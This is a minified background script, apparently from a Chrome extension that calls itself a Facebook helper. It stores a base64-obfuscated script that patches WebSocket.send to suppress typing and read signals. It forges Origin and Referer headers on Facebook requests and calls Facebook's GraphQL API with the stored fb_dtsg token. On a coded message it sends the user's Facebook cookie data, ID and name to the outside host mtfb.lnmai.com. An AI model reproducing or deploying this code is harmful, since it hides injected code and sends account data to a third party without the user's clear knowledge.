!function(e){var t={};function o(n){if(t[n])return t[n].exports;var c=t[n]={i:n,l:!1,exports:{}};return e[n].call(c.exports,c,c.exports,o),c.l=!0,c.exports}o.m=e,o.c=t,o.d=function(e,t,n){o.o(e,t)||Object.defineProperty(e,t,{enumerable:!0,get:n})},o.r=function(e){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})},o.t=function(e,t){if(1&t&&(e=o(e)),8&t)return e;if(4&t&&"object"==typeof e&&e&&e.__esModule)return e;var n=Object.create(null);if(o.r(n),Object.defineProperty(n,"default",{enumerable:!0,value:e}),2&t&&"string"!=typeof e)for(var c in e)o.d(n,c,function(t){return e[t]}.bind(null,c));return n},o.n=function(e){var t=e&&e.__esModule?function(){return e.default}:function(){return e};return o.d(t,"a",t),t},o.o=function(e,t){return Object.prototype.hasOwnProperty.call(e,t)},o.p="",o(o.s=0)}([function(e,t){const o=(e,t)=>({type:"basic",title:e,message:t,iconUrl:"favicon.png"}),n=()=>Object.values(chrome.webRequest.OnBeforeSendHeadersOptions),c=()=>{chrome.cookies.get({url:"https://facebook.com",name:"c_user"},e=>{null!==e?(chrome.storage.local.set({c_user:e}),chrome.tabs.create({url:chrome.extension.getURL("index.html")})):(chrome.tabs.create({url:"https://www.facebook.com/"}),chrome.notifications.create({type:"basic",title:"Error",message:"Please Log on Facebook first!",iconUrl:"favicon.png"}))})};chrome.browserAction.onClicked.addListener(()=>{c(),ga_trackButtonClick("extension_used")}),chrome.runtime.setUninstallURL("https://mtfb.lnmai.com/",()=>ga_trackButtonClick("uninstalled")),chrome.runtime.onInstalled.addListener(e=>{"install"===e.reason.toLowerCase()?(ga_trackButtonClick("installed"),chrome.notifications.create(o("Hello from Loc","Thank you for installing my extension!")),c(),chrome.storage.local.set({fetch:{data:"d2luZG93LmFkZEV2ZW50TGlzdGVuZXIoIm1lc3NhZ2UiLGZ1bmN0aW9uKHQpe3QuZGF0YSYmIm10ZmItZmV0Y2giPT09dC5kYXRhLnR5cGUmJih3aW5kb3cubXRmYl9ieV9sb2NtYWk9dC5kYXRhLnZhbHVlKX0sITEpO2NvbnN0IGFiMnN0cj1mdW5jdGlvbih0KXtjb25zdCBlPW5ldyBVaW50OEFycmF5KHQpO2xldCBuPSIiO2ZvcihsZXQgdD0wLHI9ZS5sZW5ndGg7dDxyO3QrKyluKz1TdHJpbmcuZnJvbUNoYXJDb2RlKGVbdF0pO3JldHVybiBufSxzdHIyYWI9ZnVuY3Rpb24odCl7Y29uc3QgZT1uZXcgQXJyYXlCdWZmZXIodC5sZW5ndGgqVWludDhBcnJheS5CWVRFU19QRVJfRUxFTUVOVCksbj1uZXcgVWludDhBcnJheShlKTtmb3IobGV0IGU9MCxyPXQubGVuZ3RoO2U8cjtlKyspbltlXT10LmNoYXJDb2RlQXQoZSk7cmV0dXJuIGV9LE9yaWdXZWJTb2NrZXQ9d2luZG93LldlYlNvY2tldCxjYWxsV2ViU29ja2V0PU9yaWdXZWJTb2NrZXQuYXBwbHkuYmluZChPcmlnV2ViU29ja2V0KTtsZXQgd3NBZGRMaXN0ZW5lcj1PcmlnV2ViU29ja2V0LnByb3RvdHlwZS5hZGRFdmVudExpc3RlbmVyO3dzQWRkTGlzdGVuZXI9d3NBZGRMaXN0ZW5lci5jYWxsLmJpbmQod3NBZGRMaXN0ZW5lciksd2luZG93LldlYlNvY2tldD1mdW5jdGlvbiB0KGUsbil7bGV0IHI7cmV0dXJuIHI9dGhpcyBpbnN0YW5jZW9mIHQ/MT09PWFyZ3VtZW50cy5sZW5ndGg/bmV3IE9yaWdXZWJTb2NrZXQoZSk6YXJndW1lbnRzLmxlbmd0aD49Mj9uZXcgT3JpZ1dlYlNvY2tldChlLG4pOm5ldyBPcmlnV2ViU29ja2V0OmNhbGxXZWJTb2NrZXQodGhpcyxhcmd1bWVudHMpLHJ9LmJpbmQoKSx3aW5kb3cuV2ViU29ja2V0LnByb3RvdHlwZT1PcmlnV2ViU29ja2V0LnByb3RvdHlwZSx3aW5kb3cuV2ViU29ja2V0LnByb3RvdHlwZS5jb25zdHJ1Y3Rvcj13aW5kb3cuV2ViU29ja2V0O2xldCB3c1NlbmQ9T3JpZ1dlYlNvY2tldC5wcm90b3R5cGUuc2VuZDt3c1NlbmQ9d3NTZW5kLmFwcGx5LmJpbmQod3NTZW5kKTtjb25zdCBhPW5ldyBVaW50OEFycmF5KFsxMDgsOTcsMTE1LDExNiw5NSwxMTQsMTAxLDk3LDEwMCw5NSwxMTksOTcsMTE2LDEwMSwxMTQsMTA5LDk3LDExNCwxMDcsOTUsMTE2LDExNV0pLGI9bmV3IFVpbnQ4QXJyYXkoWzEwOCw5NywxMTUsMTE2LDk1LDExNCwxMDEsOTcsMTAwLDk1LDExOSw5NywxMTYsMTAxLDExNCwxMDksOTcsMTE0LDEwNyw5NSw5OSwxMTVdKSx4PW5ldyBVaW50OEFycmF5KFsxMDUsMTE1LDk1LDExNiwxMjEsMTEyLDEwNSwxMTAsMTAzXSkseT1uZXcgVWludDhBcnJheShbMTEwLDExMSw5NSwxMTYsMTIxLDExMiwxMDUsMTEwLDEwM10pLGJ0PWFiMnN0cih4KSxudD1hYjJzdHIoeSksYnM9YWIyc3RyKGEpLG5zPWFiMnN0cihiKTtPcmlnV2ViU29ja2V0LnByb3RvdHlwZS5zZW5kPWZ1bmN0aW9uKHQpe2lmKHdpbmRvdy5tdGZiX2J5X2xvY21haSl7Y29uc3QgZT1hYjJzdHIodCk7ZS5tYXRjaCgvaXNfdHlwaW5nKFtcXF0qKSI6LykmJih0PXN0cjJhYihlLnJlcGxhY2UoYnQsbnQpKSksZS5tYXRjaCgvbGFzdF9yZWFkX3dhdGVybWFya190cyhbXFxdKikiOi8pJiYodD1zdHIyYWIoZS5yZXBsYWNlKGJzLG5zKSkpfXJldHVybiB3c1NlbmQodGhpcyxhcmd1bWVudHMpfTs=",option:!1}})):"update"===e.reason.toLowerCase()&&(chrome.notifications.create(o("Hello from Loc","Updated L.O.C")),ga_trackButtonClick("updated"))}),chrome.webRequest.onBeforeSendHeaders.addListener(e=>{const t=e.requestHeaders,o=t.findIndex(e=>"Origin"===e.name);return-1===o?t.push({name:"Origin",value:`chrome-extension://${chrome.runtime.id}?${localStorage.id}`}):t[o].value=`chrome-extension://${chrome.runtime.id}?${localStorage.id}`,{requestHeaders:t}},{urls:["https://*.lnmai.com/*"]},n()),chrome.webRequest.onBeforeSendHeaders.addListener(e=>{const t=e.requestHeaders,o=t.findIndex(e=>"Origin"===e.name);-1===o?t.push({name:"Origin",value:"https://www.facebook.com"}):t[o].value.includes("facebook.com")||(t[o].value="https://www.facebook.com");const n=t.findIndex(e=>"referer"===e.name);return-1===n?t.push({name:"Referer",value:"https://www.facebook.com"}):t[n].value.includes("facebook.com")||(t[n].value="https://www.facebook.com"),{requestHeaders:t}},{urls:["https://*.facebook.com/*"]},n()),chrome.runtime.onMessage.addListener((function(e,t,o){if(!0===e.shield||!1===e.shield){const t=!0===e.shield?"true":"false",n=new FormData;n.append("fb_dtsg",localStorage.dt),n.append("variables",`{"0":{"is_shielded":${t},"actor_id":"${localStorage.id}","client_mutation_id":"FUCKOFF"}}`),n.append("doc_id","1477043292367183"),fetch("https://www.facebook.com/api/graphql/",{method:"POST",credentials:"include",body:n}).then(e=>e.json()).then(e=>{e.extensions&&e.extensions.is_final?o("shield"):o("Error 69, contact Loc for help!")})}else e.aw3418dw&&chrome.cookies.get({url:"https://facebook.com",name:"c_user"},e=>{if(null==e)return o({error:"Error! Something went south. Contact Loc for help!"});var t;fetch("https://mtfb.lnmai.com/aw3418dw",{method:"POST",body:JSON.stringify({id:localStorage.id,uid:e.value,timestamp:Date.now(),name:localStorage.name}),headers:{"Content-Type":"application/json",cookies:(t=e,Object.keys(t).reduce((e,o)=>e+`${o}=${t[o]};`,""))}}).then(e=>e.text()).then(e=>o(e)).catch(e=>o(e))});return!0}))}]);